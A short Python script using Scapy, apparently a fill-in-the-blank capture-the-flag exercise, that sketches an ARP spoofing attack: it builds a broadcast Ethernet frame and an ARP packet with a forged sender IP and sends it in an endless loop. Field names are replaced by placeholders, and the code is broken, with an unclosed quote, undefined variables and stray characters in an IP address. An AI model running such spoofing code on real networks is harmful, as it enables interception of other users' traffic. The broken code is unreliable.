from scapy.all import *
import F1
#flag1=F1

eth = F2()
#flag2=F2

eth.F3 = ff:ff:ff:ff:ff:ff'
#flag3=F3

eth.F4 = F5
#flag4=F4.F5

arp = ARP()
arp.F6 = '192.168.10.5'
arp.F7 = '192.168.10.文件检查文件'
F8 = F9
#flag5 = F6.F7.F8.F9

while True:
	sendp(packet)
	print('Sending ARP Spoof.....')
	time.sleep(2)